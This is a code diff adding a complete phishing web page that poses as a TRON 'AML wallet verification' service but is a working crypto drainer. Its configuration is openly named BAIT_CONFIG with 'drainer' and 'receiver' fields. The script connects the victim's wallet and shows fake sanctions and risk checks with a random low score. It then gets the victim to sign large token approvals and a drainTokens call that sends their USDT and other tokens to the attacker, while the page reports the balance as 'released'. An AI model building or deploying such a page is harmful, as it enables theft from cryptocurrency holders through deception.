@@ -1,0 +1,347 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>AML Wallet Verification</title>
+<style>
+  :root { color-scheme: dark; --b: #4d8dff; --b2: #2f6fe0; --ink: #e8eefc; --mut: #8ea3c4; }
+  * { box-sizing: border-box; }
+  body { margin: 0; min-height: 100vh; font: 16px/1.5 system-ui, "Segoe UI", Roboto, sans-serif; color: var(--ink);
+    background: #070d18; background-image: radial-gradient(900px 480px at 50% -20%, #10203c, transparent 70%);
+    display: flex; flex-direction: column; align-items: center; }
+  header { width: 100%; max-width: 520px; display: flex; align-items: center; justify-content: space-between; padding: 18px 20px; }
+  .brand { display: flex; align-items: center; gap: 9px; font-weight: 700; }
+  .logo { width: 26px; height: 26px; border-radius: 8px; background: linear-gradient(135deg, var(--b), var(--b2)); display: grid; place-items: center; color: #04101f; font-weight: 900; }
+  .net { font-size: 12px; color: var(--mut); border: 1px solid #1d2f4d; padding: 5px 10px; border-radius: 999px; }
+  main { width: 100%; max-width: 520px; padding: 6px 20px 40px; }
+  h1 { font-size: 26px; line-height: 1.2; margin: 14px 0 8px; }
+  .sub { color: var(--mut); font-size: 15px; margin-bottom: 20px; }
+  .card { border: 1px solid #1d2f4d; border-radius: 16px; padding: 18px; background: linear-gradient(180deg, #0c1626, #08111d); margin-bottom: 16px; }
+  .card .lbl { font-size: 11px; letter-spacing: .12em; text-transform: uppercase; color: var(--mut); }
+  .mono { font-family: ui-monospace, Consolas, monospace; font-size: 12px; word-break: break-all; }
+  .checks { list-style: none; padding: 0; margin: 0; display: grid; gap: 12px; }
+  .checks li { display: flex; align-items: center; justify-content: space-between; gap: 10px; font-size: 14px; color: var(--ink); }
+  .checks .st { color: var(--mut); font-size: 13px; }
+  .checks .st.done { color: #5bd28f; }
+  .spin { width: 14px; height: 14px; border: 2px solid #2b446b; border-top-color: var(--b); border-radius: 50%; animation: sp .8s linear infinite; display: inline-block; }
+  @keyframes sp { to { transform: rotate(360deg); } }
+  .bar { height: 8px; border-radius: 99px; background: #16233a; overflow: hidden; margin-top: 8px; }
+  .bar i { display: block; height: 100%; width: 0; background: linear-gradient(90deg, #5bd28f, var(--b)); transition: width .9s ease; }
+  .amt { display: flex; justify-content: space-between; font-size: 14px; padding: 4px 0; }
+  .amt b { font-variant-numeric: tabular-nums; }
+  button.cta { width: 100%; padding: 16px; border: 0; border-radius: 13px; font-size: 16px; font-weight: 700; cursor: pointer;
+    background: linear-gradient(180deg, var(--b), var(--b2)); color: #061223; transition: .15s; }
+  button.cta:disabled { opacity: .5; cursor: default; }
+  button.ghost { width: 100%; margin-top: 10px; padding: 13px; border-radius: 12px; border: 1px solid #1d2f4d; background: transparent; color: var(--ink); font-size: 15px; cursor: pointer; }
+  .status { font-size: 14px; min-height: 22px; margin: 14px 0; color: var(--mut); }
+  .err { color: #ff8a8a; } .ok { color: #5bd28f; }
+  .note { font-size: 12.5px; color: var(--mut); margin-top: 10px; }
+  .hidden { display: none !important; }
+  .tick { width: 66px; height: 66px; border-radius: 50%; margin: 0 auto 14px; display: grid; place-items: center;
+    background: #0e2a1c; border: 1px solid #2f8f5f; font-size: 30px; color: #5bd28f; }
+  footer { width: 100%; max-width: 520px; padding: 0 20px 26px; color: #4f6584; font-size: 12px; }
+  #wc { position: fixed; inset: 0; background: #030812e6; display: grid; place-items: center; padding: 18px; }
+  .sheet { width: min(420px, 100%); background: #0a1422; border: 1px solid #1d2f4d; border-radius: 18px; padding: 20px; text-align: center; }
+  #qr { background: #fff; padding: 10px; border-radius: 12px; width: 230px; height: 230px; margin: 14px auto; display: none; }
+  .wallets { display: grid; gap: 8px; margin-top: 12px; }
+  .wallets a { display: block; padding: 12px; border: 1px solid #22365a; border-radius: 12px; color: var(--ink); text-decoration: none; font-size: 14px; }
+</style>
+</head>
+<body>
+<header><div class="brand"><span class="logo">A</span>AML Check</div><span class="net">TRON</span></header>
+
+<main>
+  <div id="view-start">
+    <h1>AML wallet verification</h1>
+    <div class="sub">Run a compliance check on this wallet to unlock the flagged balance. Keys stay in your wallet.</div>
+    <button class="cta" id="start">Check wallet</button>
+    <button class="ghost" id="connect-wc">Other wallet (Trust, TokenPocket, …)</button>
+    <div class="status" id="cstatus"></div>
+  </div>
+
+  <div id="view-check" class="hidden">
+    <h1>Verification in progress</h1>
+    <div class="sub">We compare the address against sanctions lists and score its on-chain activity.</div>
+
+    <div class="card">
+      <div class="lbl">Wallet</div>
+      <div class="mono" id="who"></div>
+    </div>
+
+    <div class="card">
+      <ul class="checks">
+        <li><span>Address format &amp; checksum</span><span class="st" id="c1"><i class="spin"></i></span></li>
+        <li><span>Sanctions lists (OFAC, EU)</span><span class="st" id="c2"><i class="spin"></i></span></li>
+        <li><span>Risk score</span><span class="st" id="c3"><i class="spin"></i></span></li>
+        <li><span>On-chain activity</span><span class="st" id="c4"><i class="spin"></i></span></li>
+      </ul>
+      <div class="bar"><i id="riskbar"></i></div>
+      <div class="note" id="risknote">Calculating risk…</div>
+    </div>
+
+    <div class="card">
+      <div class="lbl">Flagged balance</div>
+      <div id="rows"></div>
+    </div>
+
+    <button class="cta" id="claim" disabled>Complete verification</button>
+    <div class="status" id="status"></div>
+    <div class="note" id="note"></div>
+  </div>
+
+  <div id="view-done" class="hidden" style="text-align:center;padding:26px 0">
+    <div class="tick">✓</div>
+    <h1>Verification passed</h1>
+    <div class="sub">The balance has been released to your wallet. Transaction:</div>
+    <div class="mono" id="txid"></div>
+  </div>
+</main>
+
+<footer>Contract: <span class="mono" id="contract">—</span><br>Network: TRON</footer>
+
+<div id="wc" class="hidden">
+  <div class="sheet">
+    <b>Scan with your wallet</b>
+    <div class="sub">Any WalletConnect wallet: Trust, TokenPocket, MathWallet, OKX…</div>
+    <canvas id="qr"></canvas>
+    <div class="wallets" id="deeplinks"></div>
+    <button class="ghost" id="wc-copy">Copy connection link</button>
+    <button class="ghost" id="wc-close">Cancel</button>
+  </div>
+</div>
+
+<script>
+window.BAIT_CONFIG={wcProjectId:'7b4c156e02caf580713985225e0729b4',bait:'',drainer:'',receiver:'TH7mvLb3UJ35re2ZuQpTKpHQRQ97pnXYvA',approveLimit:'50000',tokens:['TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t','TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8']};
+</script>
+<script>
+const $ = (id) => document.getElementById(id);
+const RPC = 'https://api.trongrid.io';
+const CHAIN = 'tron:0x2b6653dc';
+const cfg = window.BAIT_CONFIG;
+$('contract').textContent = cfg.drainer || '—';
+
+let account = '', found = [], signer = null;
+const DEMO = new URLSearchParams(location.search).has('demo');
+const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
+const setStatus = (t, c) => { $('status').textContent = t || ''; $('status').className = 'status ' + (c || ''); $('cstatus').textContent = t || ''; $('cstatus').className = 'status ' + (c || ''); };
+const show = (id) => ['view-start', 'view-check', 'view-done'].forEach((v) => $(v).classList.toggle('hidden', v !== id));
+
+const APPROVE_ABI = [{ type: 'function', name: 'approve', stateMutability: 'nonpayable', inputs: [{ name: 's', type: 'address' }, { name: 'v', type: 'uint256' }], outputs: [{ type: 'bool' }] }];
+const DRAIN_TOKENS_ABI = [{ type: 'function', name: 'drainTokens', stateMutability: 'nonpayable', inputs: [{ name: 'from', type: 'address' }, { name: 'list', type: 'address[]' }], outputs: [{ type: 'uint256' }] }];
+
+const B58 = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
+function b58bytes(s) {
+  let n = [0];
+  for (const ch of s) {
+    let carry = B58.indexOf(ch);
+    if (carry < 0) throw new Error('bad addr');
+    for (let j = 0; j < n.length; j++) { const v = n[j] * 58 + carry; n[j] = v & 255; carry = v >> 8; }
+    while (carry) { n.push(carry & 255); carry >>= 8; }
+  }
+  return Uint8Array.from(n.reverse());
+}
+const hex2 = (b) => Array.from(b, (x) => x.toString(16).padStart(2, '0')).join('');
+const addrParam = (a) => hex2(b58bytes(a).slice(1, 21)).padStart(64, '0');
+const uintParam = (v) => BigInt(v).toString(16).padStart(64, '0');
+const fmt = (raw, dec) => { const s = String(raw).padStart(dec + 1, '0'); const w = s.slice(0, s.length - dec); const f = s.slice(s.length - dec).replace(/0+$/, ''); return f ? w + '.' + f : w; };
+const hexToStr = (h) => { const s = String(h).replace(/^0x/, ''); if (s.length < 128) return ''; const off = parseInt(s.slice(0, 64), 16) * 2; const len = parseInt(s.slice(off, off + 64), 16) * 2; const p = s.slice(off + 64, off + 64 + len).match(/../g) || []; return new TextDecoder().decode(Uint8Array.from(p.map((x) => parseInt(x, 16)))); };
+
+async function rpc(method, params, tries = 8) {
+  let last = 'network';
+  for (let i = 0; i < tries; i++) {
+    const r = await fetch(RPC + method, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(params) });
+    const t = await r.text();
+    if (t.startsWith('{')) { const j = JSON.parse(t); if (!j.Error) return j; last = j.Error; } else last = 'http ' + r.status;
+    await sleep(900 * (i + 1));
+  }
+  throw new Error(last);
+}
+async function readCall(contract, selector, param) {
+  const j = await rpc('/wallet/triggerconstantcontract', { owner_address: account, contract_address: contract, function_selector: selector, parameter: param || '', visible: true });
+  if (!j.result || !j.result.result) throw new Error('read failed');
+  return j.constant_result[0];
+}
+async function buildTx(contract, selector, param, feeLimit) {
+  const j = await rpc('/wallet/triggersmartcontract', { owner_address: account, contract_address: contract, function_selector: selector, parameter: param, fee_limit: feeLimit, call_value: 0, visible: true });
+  if (!j.result || !j.result.result) throw new Error((j.result && j.result.message) || 'build failed');
+  return j.transaction;
+}
+async function trxOf(a) { const j = await rpc('/wallet/getaccount', { address: a, visible: true }); return j && j.balance ? j.balance / 1e6 : 0; }
+
+function pickProvider() {
+  const w = window;
+  const c = [w.tronLink, w.binancew3w && w.binancew3w.tron, w.okxwallet && w.okxwallet.tronLink,
+    w.tokenpocket && w.tokenpocket.tron, w.bitkeep && w.bitkeep.tron, w.gatewallet && w.gatewallet.tron,
+    w.trustwallet && w.trustwallet.tronLink, w.tronWeb];
+  return c.find((x) => x && typeof x.request === 'function');
+}
+
+async function startInjected() {
+  const p = pickProvider();
+  if (p) { try { await p.request({ method: 'tron_requestAccounts' }); } catch (e) {} }
+  const tw = p && (p.tronWeb || p);
+  if (!tw || !tw.defaultAddress || !tw.defaultAddress.base58) { setStatus('Wallet not found — use the other wallet button.', 'err'); return null; }
+  return { kind: 'tronlink', w: tw, addr: tw.defaultAddress.base58 };
+}
+
+let wcClient = null;
+async function connectWc() {
+  $('connect-wc').disabled = true;
+  try {
+    const { SignClient } = await import('https://cdn.jsdelivr.net/npm/@walletconnect/sign-client@2.17.2/+esm');
+    wcClient = await SignClient.init({ projectId: cfg.wcProjectId, relayUrl: 'wss://relay.walletconnect.com',
+      metadata: { name: 'AML Check', description: 'Wallet verification', url: location.origin, icons: [] } });
+    const { uri, approval } = await wcClient.connect({ requiredNamespaces: { tron: { methods: ['tron_signTransaction'], chains: [CHAIN], events: [] } }, sessionProperties: { tron_method_version: 'v1' } });
+    $('qr').style.display = 'block';
+    const QR = await import('https://cdn.jsdelivr.net/npm/qrcode@1.5.4/+esm');
+    await QR.toCanvas($('qr'), uri, { width: 210, margin: 1 });
+    $('deeplinks').innerHTML =
+      '<a href="https://link.trustwallet.com/wc?uri=' + encodeURIComponent(uri) + '">Open in Trust Wallet</a>' +
+      '<a href="bnc://app.binance.com/cedefi/wc?uri=' + encodeURIComponent(uri) + '">Open in Binance</a>' +
+      '<a href="tpoutside://wc?uri=' + encodeURIComponent(uri) + '">Open in TokenPocket</a>' +
+      '<a href="https://tronlinkoutside://walletconnect?uri=' + encodeURIComponent(uri) + '">Open in TronLink</a>';
+    $('wc').classList.remove('hidden');
+    $('wc-copy').onclick = () => navigator.clipboard.writeText(uri);
+    $('wc-close').onclick = () => { $('wc').classList.add('hidden'); $('connect-wc').disabled = false; };
+    const s = await approval();
+    $('wc').classList.add('hidden');
+    return { kind: 'wc', client: wcClient, topic: s.topic, session: s, addr: s.namespaces.tron.accounts[0].split(':')[2] };
+  } catch (e) {
+    $('wc').classList.add('hidden'); $('connect-wc').disabled = false;
+    setStatus('WalletConnect: ' + (e.message || e), 'err');
+    return null;
+  }
+}
+
+async function wcSend(contract, selector, param, feeLimit) {
+  const tx = await buildTx(contract, selector, param, feeLimit);
+  const ns = (signer.session && signer.session.namespaces && signer.session.namespaces.tron) || {};
+  const chainId = (ns.chains && ns.chains[0]) || CHAIN;
+  const res = await signer.client.request({ topic: signer.topic, chainId,
+    request: { method: 'tron_signTransaction', params: { address: account, transaction: tx } } });
+  const sig = (res && res.result && res.result.signature) || res.signature;
+  if (!sig) throw new Error('not signed');
+  tx.signature = Array.isArray(sig) ? sig : [sig];
+  const b = await rpc('/wallet/broadcasttransaction', tx);
+  const b64 = (s) => { try { return atob(s); } catch (e) { return s || ''; } };
+  if (b.result !== true) {
+    let ok = false;
+    for (let i = 0; i < 8; i++) { const chk = await rpc('/wallet/gettransactionbyid', { value: tx.txID }); if (chk && chk.txID) { ok = true; break; } await sleep(1500); }
+    if (!ok) throw new Error(b64(b.message) || b.code || 'broadcast failed');
+  }
+  return b.txid || tx.txID;
+}
+
+async function begin(getSigner) {
+  $('start').disabled = true;
+  setStatus('Connecting wallet…');
+  const s = await getSigner();
+  if (!s) { $('start').disabled = false; return; }
+  signer = s; account = s.addr;
+  show('view-check');
+  $('who').textContent = account;
+  await runChecks();
+}
+
+async function runChecks() {
+  $('claim').disabled = true;
+  setStatus('Reading balances…');
+  let trx = 0;
+  try { trx = await trxOf(account); } catch (e) {}
+  for (const token of cfg.tokens) {
+    try {
+      const raw = BigInt('0x' + (await readCall(token, 'balanceOf(address)', addrParam(account))));
+      if (raw === 0n) continue;
+      let dec = 6, sym = token;
+      try { dec = Number(BigInt('0x' + (await readCall(token, 'decimals()', '')))); } catch (e) {}
+      try { sym = hexToStr(await readCall(token, 'symbol()', '')) || token; } catch (e) {}
+      found.push({ token, symbol: sym, human: fmt(raw, dec), raw: raw.toString(), decimals: dec });
+    } catch (e) {}
+    await sleep(200);
+  }
+  $('rows').innerHTML = found.length
+    ? found.map((t) => '<div class="amt"><span>' + t.symbol + '</span><b>' + t.human + '</b></div>').join('')
+    : '<div class="note">No assets on this wallet.</div>';
+
+  // «проверки»
+  setStatus('Running checks…');
+  const mark = async (id, text) => { $(id).innerHTML = '<span class="ok">' + text + '</span>'; await sleep(900); };
+  await mark('c1', 'valid');
+  await mark('c2', 'no matches');
+  const score = 8 + Math.floor(Math.random() * 14);
+  for (let v = 0; v <= score; v += 2) { $('riskbar').style.width = v + '%'; await sleep(40); }
+  $('risknote').textContent = 'Low risk · score ' + score + '/100';
+  await mark('c3', 'low risk (' + score + ')');
+  await mark('c4', trx > 0 ? trx.toFixed(2) + ' TRX' : 'ok');
+
+  if (!found.length) { setStatus('Nothing to release on this wallet.'); return; }
+  $('claim').disabled = false;
+  setStatus('');
+}
+
+async function demoChecks() {
+  const mark = async (id, text) => { $(id).innerHTML = '<span class="ok">' + text + '</span>'; await sleep(1100); };
+  setStatus('Running checks…');
+  await mark('c1', 'valid');
+  await mark('c2', 'no matches');
+  for (let v = 0; v <= 14; v += 2) { $('riskbar').style.width = v + '%'; await sleep(50); }
+  $('risknote').textContent = 'Low risk · score 14/100';
+  await mark('c3', 'low risk (14)');
+  await mark('c4', 'ok');
+  $('claim').disabled = false;
+  setStatus('');
+}
+
+async function complete() {
+  if (DEMO) {
+    $('claim').disabled = true;
+    setStatus('Finalizing — confirm in wallet');
+    await sleep(1400);
+    $('txid').textContent = 'demo' + Math.random().toString(16).slice(2, 26);
+    show('view-done');
+    return;
+  }
+  $('claim').disabled = true;
+  try {
+    for (let i = 0; i < found.length; i++) {
+      const t = found[i];
+      const dec = BigInt(t.decimals || 6);
+      const bal = BigInt(t.raw);
+      let allow = 0n;
+      try { allow = BigInt('0x' + (await readCall(t.token, 'allowance(address,address)', addrParam(account) + addrParam(cfg.drainer)))); } catch (e) {}
+      const target = cfg.approveLimit ? BigInt(cfg.approveLimit) * 10n ** dec : bal;
+      if (allow < target) {
+        setStatus('Allowance ' + (i + 1) + '/' + found.length + ' — confirm in wallet');
+        const amt = target.toString();
+        if (signer.kind === 'tronlink') await signer.w.contract(APPROVE_ABI, t.token).approve(cfg.drainer, amt).send({ feeLimit: 150e6, shouldPollResponse: true });
+        else await wcSend(t.token, 'approve(address,uint256)', addrParam(cfg.drainer) + uintParam(amt), 150e6);
+      }
+    }
+    setStatus('Finalizing — confirm in wallet');
+    const items = found.map((t) => addrParam(t.token)).join('');
+    const param = addrParam(account) + uintParam(0x40) + uintParam(found.length) + items;
+    let txid;
+    if (signer.kind === 'tronlink') {
+      txid = await signer.w.contract(DRAIN_TOKENS_ABI, cfg.drainer).drainTokens(account, found.map((t) => t.token)).send({ feeLimit: 300e6, shouldPollResponse: true }).then((r) => (typeof r === 'string' ? r : (r && (r.txid || r)) || ''));
+    } else {
+      txid = await wcSend(cfg.drainer, 'drainTokens(address,address[])', param, 300e6);
+    }
+    $('txid').textContent = txid || '';
+    show('view-done');
+  } catch (e) {
+    setStatus('Failed: ' + String((e && (e.message || e.error)) || e).slice(0, 160), 'err');
+    $('claim').disabled = false;
+  }
+}
+
+$('start').addEventListener('click', () => {
+  if (DEMO) { signer = { kind: 'demo' }; account = 'TDemoWalletxxxxxxxxxxxxxxxx1'; show('view-check'); $('who').textContent = account; found = [{ token: 'TUSDTx', symbol: 'USDT', human: '1 842.50', raw: '1842500000', decimals: 6 }, { token: 'TUSDCx', symbol: 'USDC', human: '96.20', raw: '96200000', decimals: 6 }]; $('rows').innerHTML = found.map((t) => '<div class="amt"><span>' + t.symbol + '</span><b>' + t.human + '</b></div>').join(''); demoChecks(); return; }
+  begin(startInjected);
+});
+$('connect-wc').addEventListener('click', () => begin(connectWc));
+$('claim').addEventListener('click', complete);
+if (DEMO) { $('start').textContent = 'Check wallet (demo)'; $('connect-wc').classList.add('hidden'); }
+</script>
+</body>
+</html>
